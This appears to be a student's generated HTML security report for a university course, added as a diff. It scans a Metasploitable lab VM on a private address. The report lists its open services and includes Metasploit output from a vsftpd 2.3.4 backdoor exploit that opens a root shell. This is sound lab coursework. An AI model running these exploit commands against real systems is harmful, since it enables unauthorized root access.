@@ -1,0 +1,122 @@
+<html>
+    <head>
+        <title>Security Report prepared for CSCI 1411 - Spring 2024</title>
+    </head>
+    <body>
+        <h1>Security Report prepared for CSCI 1411 - Spring 2024</h1>
+        <p>Updated on 10/01/2024 06:38:32 PM EDT by Daniel Romero</p>
+        
+        <h2>Target IP Address</h2>
+<pre>
+IP Address: 10.0.2.5
+</pre>
+        
+        
+        <h2>System Machine Name</h2>
+<pre>
+Computer name: metasploitable
+</pre>
+        
+        
+        <h2>Target Ping Response</h2>
+<pre>
+PING 10.0.2.5 (10.0.2.5) 56(84) bytes of data.
+64 bytes from 10.0.2.5: icmp_seq=1 ttl=64 time=0.668 ms
+64 bytes from 10.0.2.5: icmp_seq=2 ttl=64 time=0.901 ms
+64 bytes from 10.0.2.5: icmp_seq=3 ttl=64 time=0.709 ms
+64 bytes from 10.0.2.5: icmp_seq=4 ttl=64 time=0.751 ms
+
+--- 10.0.2.5 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3036ms
+rtt min/avg/max/mdev = 0.668/0.757/0.901/0.088 ms
+</pre>
+        
+        
+        <h2>Ports open</h2>
+<pre>
+21/tcp    open  ftp         vsftpd 2.3.4
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+53/tcp    open  domain      ISC BIND 9.4.2
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp   open  rpcbind     2 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login       OpenBSD or Solaris rlogind
+514/tcp   open  tcpwrapped
+1099/tcp  open  java-rmi    GNU Classpath grmiregistry
+1524/tcp  open  bindshell   Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+2121/tcp  open  ftp         ProFTPD 1.3.1
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         UnrealIRCd
+6697/tcp  open  irc         UnrealIRCd
+8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+38476/tcp open  status      1 (RPC #100024)
+39197/tcp open  nlockmgr    1-4 (RPC #100021)
+47288/tcp open  mountd      1-3 (RPC #100005)
+48398/tcp open  java-rmi    GNU Classpath grmiregistry
+</pre>
+        
+        
+        <h2>Exploits</h2>
+21/tcp    open  ftp         vsftpd 2.3.4
+<h3>Results of Vsftpd exploit attempt on target</h3>
+<pre>
+[0m[36m[0m[31m               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.[0m[37m                ##########[0m
+[31m    .0MMMMMMMMMMMMMMMMWc[0m[37m            #+#    #+#[0m
+[31m      ;0MMMMMMMMMMMMMMMo.[0m[37m          +:+[0m
+[31m        .dNMMMMMMMMMMMMo[0m          +[37m#+[0m+:++#+
+[31m           'oOWMMMMMMMMo[0m                +:+
+[31m               .,cdkO0K;[0m        :+:    :+:                                
+                                :::::::+:
+                      [37mMetasploit[0m[0m
+
+       =[ [33mmetasploit v6.1.14-dev[0m                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Open an interactive Ruby terminal with 
+[32mirb[0m
+
+[1m[34m[*][0m Processing vsftpd.rc for ERB directives.
+resource (vsftpd.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+resource (vsftpd.rc)> set RHOST 10.0.2.5
+[0mRHOST => 10.0.2.5
+resource (vsftpd.rc)> exploit -z
+[0m[1m[34m[*][0m 10.0.2.5:21 - The port used by the backdoor bind listener is already open
+[1m[32m[+][0m 10.0.2.5:21 - UID: uid=0(root) gid=0(root)
+[1m[34m[*][0m Found shell.
+[1m[34m[*][0m Command shell session 1 opened (10.0.2.15:43255 -> 10.0.2.5:6200 ) at 2024-10-01 18:38:55 -0400
+[1m[34m[*][0m Session 1 created in the background.
+resource (vsftpd.rc)> exit -y
+[0m</pre>
+        <h1>END OF REPORT</h1>
+
